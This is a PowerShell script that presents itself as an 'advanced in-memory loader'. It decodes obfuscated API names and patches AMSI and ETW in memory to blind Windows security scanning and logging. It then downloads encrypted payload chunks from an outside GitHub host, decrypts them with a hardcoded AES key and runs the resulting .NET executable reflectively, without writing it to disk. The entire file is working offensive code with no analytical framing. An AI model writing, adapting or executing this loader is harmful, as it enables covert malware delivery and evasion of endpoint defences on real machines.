# Advanced in-memory loader: AMSI+ETW patch, AES-256-CBC payload, decrypt in RAM,
# reflective .NET execution. Windows PowerShell 5.1 (x64).
$ErrorActionPreference = 'SilentlyContinue'

$sb = [Convert]::FromBase64String('cFJDelhTQltSf1ZZU1tSS3BSQ2dFWFR2U1NFUkRES2FeRUNCVltnRVhDUlRDS3tYVlN7XlVFVkVOdktcUkVZUlsEBRlTW1tLVlpEXhlTW1tLdlpEXmRUVll1QlFRUkVLWUNTW1sZU1tbS3JDQHJBUllDYEVeQ1JLZE5EQ1JaGVNbW0t6XlRFWERYUUMZYF5ZBAUZYllEVlFSeVZDXkFSelJDX1hTREtlQlVSQkQZZ0VYUEVWWkt6Vl5ZS19DQ0dEDRgYRVZAGVBeQ19CVUJEUkVUWFlDUllDGVRYWhhfA1RcRFJUGGVyc2NydnpjeHh7ZBhaVl5ZGEVVaEc=')
$s = (-join ($sb | % { [char]($_ -bxor 0x37) })).Split('|')

function Get-DelegateType {
    param([Type[]]$Parameters, [Type]$ReturnType)
    $d = [AppDomain]::CurrentDomain
    $an = New-Object System.Reflection.AssemblyName('D')
    $ab = $d.DefineDynamicAssembly($an, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mb = $ab.DefineDynamicModule('M', $false)
    $tb = $mb.DefineType('T', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $cb = $tb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $cb.SetImplementationFlags('Runtime, Managed')
    $m = $tb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $m.SetImplementationFlags('Runtime, Managed')
    $tb.CreateType()
}

$sys = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq $s[9] }
$un  = $sys.GetType($s[10])
$gmh = $un.GetMethod($s[0], [Type[]]@([string]))
$gpa = $un.GetMethod($s[1], [Type[]]@([System.Runtime.InteropServices.HandleRef], [string]))
$k32 = $gmh.Invoke($null, @($s[4]))
$hr  = New-Object System.Runtime.InteropServices.HandleRef($(New-Object IntPtr), $k32)
$vpA = $gpa.Invoke($null, @($hr, $s[2]))
$llA = $gpa.Invoke($null, @($hr, $s[3]))

$vpT = Get-DelegateType @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType()) ([bool])
$vp  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpT)
$llT = Get-DelegateType @([string]) ([IntPtr])
$ll  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($llA, $llT)

function Patch-Func($lib, $func, [byte[]]$patch) {
    $h  = $ll.Invoke($lib)
    $hr = New-Object System.Runtime.InteropServices.HandleRef($(New-Object IntPtr), $h)
    $a  = $gpa.Invoke($null, @($hr, $func))
    $o  = 0
    $vp.Invoke($a, [UIntPtr]$patch.Length, 0x40, [ref]$o) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $a, $patch.Length)
}

Patch-Func $s[5] $s[6] ([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3))
Patch-Func $s[7] $s[8] ([byte[]](0x33,0xC0,0xC3))

# --- AES-256-CBC payload, decrypted entirely in RAM ---
$keyB64 = 'Hn1W5YuD9ky24PW4csMiLi1OfEUdbGljLNZIsGz8nQ8='
$ivB64  = 'kXAUZ7qjWxWUIyyHImCG0Q=='
$wc = New-Object Net.WebClient
$base = 'https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/rb_a'
$b64 = ''
1..3 | % { $b64 += $wc.DownloadString($base + "$_.txt") }
$ct = [Convert]::FromBase64String($b64)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key     = [Convert]::FromBase64String($keyB64)
$aes.IV      = [Convert]::FromBase64String($ivB64)
$dec = $aes.CreateDecryptor()
$pt  = $dec.TransformFinalBlock($ct, 0, $ct.Length)

if ($pt.Length -lt 2 -or $pt[0] -ne 0x4D -or $pt[1] -ne 0x5A) {
    throw "Decrypt failed (len=$($pt.Length))."
}

# --- reflective .NET execution (no disk) ---
[string[]]$arg = @()
if ($args) { $arg = [string[]]$args }
$r = [System.Reflection.Assembly]::Load($pt)
$r.GetType($s[11]).GetMethod($s[12], [Type[]]@([string[]])).Invoke($null, @(,$arg))
